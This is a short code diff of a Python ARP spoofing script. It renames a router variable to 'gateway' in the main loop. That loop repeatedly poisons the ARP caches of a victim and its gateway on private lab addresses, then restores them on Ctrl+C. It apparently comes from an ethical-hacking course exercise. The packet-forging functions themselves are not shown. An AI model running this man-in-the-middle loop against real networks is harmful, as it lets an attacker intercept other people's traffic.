@@ -28,17 +28,17 @@ def restore(destination_ip, source_ip):
 
 
 victim_ip = "192.168.49.135"
-router_ip = "192.168.49.2"
+gateway_ip = "192.168.49.2"
 try:
     packet_sent_count = 0
     while True:
-        spoof(victim_ip, router_ip)
-        spoof(router_ip, victim_ip)
+        spoof(victim_ip, gateway_ip)
+        spoof(gateway_ip, victim_ip)
         packet_sent_count += 2
         print("\r[+] Sent " + str(packet_sent_count), end=" ")
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[-] Detected Ctrl+C ... Restoring ARP tables ... Please Wait ... \n")
-    restore(victim_ip, router_ip)
-    restore(router_ip, victim_ip)
+    restore(victim_ip, gateway_ip)
+    restore(gateway_ip, victim_ip)
